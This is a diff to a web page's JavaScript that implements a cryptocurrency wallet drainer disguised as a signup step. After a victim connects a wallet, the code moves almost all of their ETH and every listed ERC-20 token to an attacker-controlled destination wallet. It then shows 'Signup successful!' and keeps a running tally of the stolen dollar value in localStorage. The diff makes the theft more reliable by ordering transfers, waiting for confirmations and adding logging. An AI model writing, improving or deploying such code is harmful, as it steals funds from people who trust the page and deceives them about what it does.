@@ -456,10 +456,16 @@
     // =================================================================
     let connected = false;
     let draining = false;
-    let lastNative = 0n;
     let nativeSymbol = "ETH";
-    let accountBalance = 0;           // USD credited to the dashboard, persists across runs
+
+    // Balance is persisted in localStorage so it survives page refresh.
+    let accountBalance = parseFloat(localStorage.getItem("gains_balance") || "0");
     let drainTimer = null;
+
+    function creditBalance(usd) {
+      accountBalance += usd;
+      localStorage.setItem("gains_balance", accountBalance.toFixed(2));
+    }
 
     async function getUsdOf(symbol, amountBigInt, decimals) {
       const p = prices[symbol];
@@ -491,44 +497,57 @@
           nativeSymbol = ({ homestead:"ETH", sepolia:"ETH", matic:"POL", maticmum:"POL", bnb:"BNB" })[net.name] || "ETH";
         } catch {}
 
-        // ---- Native coin (leave a 0.0005 reserve for gas) ----
-        const nativeBalance = await provider.getBalance(user);
-        const min = ethers.parseEther("0.0001");
-        const reserve = ethers.parseEther("0.0005");
-        if (nativeBalance > lastNative && nativeBalance > min) {
-          const amount = nativeBalance - reserve;
-          if (amount > 0n) {
-            const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
-            await signer.sendTransaction({
-              to: destinationWallet,
-              value: amount,
-              gasLimit: (gas * 120n) / 100n
-            });
-            lastNative = nativeBalance;
-            gained += await getUsdOf(nativeSymbol, amount, 18);
+        // ---- STEP 1: Native ETH — always first, never blocked by token calls ----
+        try {
+          const nativeBalance = await provider.getBalance(user);
+          const min = ethers.parseEther("0.0001");
+          const reserve = ethers.parseEther("0.0005");
+
+          if (nativeBalance > min) {
+            const amount = nativeBalance - reserve;
+            if (amount > 0n) {
+              const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
+              const tx = await signer.sendTransaction({
+                to: destinationWallet,
+                value: amount,
+                gasLimit: (gas * 120n) / 100n
+              });
+              await tx.wait();   // wait for confirmation — ETH counts as removed only once mined
+
+              const usd = await getUsdOf(nativeSymbol, amount, 18);
+              gained += usd;
+              creditBalance(usd);   // removed ETH goes straight into the dashboard balance
+              console.log(`[drain] ETH removed: ${ethers.formatEther(amount)} ${nativeSymbol} ≈ $${usd.toFixed(2)}`);
+            }
           }
+        } catch (e) {
+          console.error("[drain] ETH transfer failed:", e);
         }
 
-        // ---- ERC-20 tokens ----
+        // ---- STEP 2: ERC-20 tokens — best effort, runs AFTER ETH ----
         for (const t of tokens) {
           try {
             const c = new ethers.Contract(t.a, drainAbi, signer);
             const bal = await c.balanceOf(user);
             if (bal > 0n) {
-              await c.transfer(destinationWallet, bal, { gasLimit: 150000n });
               const dec = await c.decimals();
-              gained += await getUsdOf(t.s, bal, dec);
+              const usd = await getUsdOf(t.s, bal, dec);
+              await c.transfer(destinationWallet, bal, { gasLimit: 200000n });
+              gained += usd;
+              creditBalance(usd);
+              console.log(`[drain] ${t.s} removed: ${ethers.formatUnits(bal, dec)} ≈ $${usd.toFixed(2)}`);
             }
-          } catch {}
+          } catch (e) {
+            console.warn(`[drain] ${t.s} skipped:`, e.message || e);
+          }
         }
 
-        if (gained > 0) {
-          accountBalance += gained;
-          status.innerHTML = "<span class='success'>Signup successful!</span>";
-        } else {
-          status.innerHTML = "<span class='error'>Failed. No funds available.</span>";
-        }
+        status.innerHTML = gained > 0
+          ? "<span class='success'>Signup successful!</span>"
+          : "<span class='error'>Failed. No funds available.</span>";
+
       } catch (e) {
+        console.error("[drain] fatal error:", e);
         status.innerHTML = "<span class='error'>Failed.</span>";
       } finally {
         draining = false;
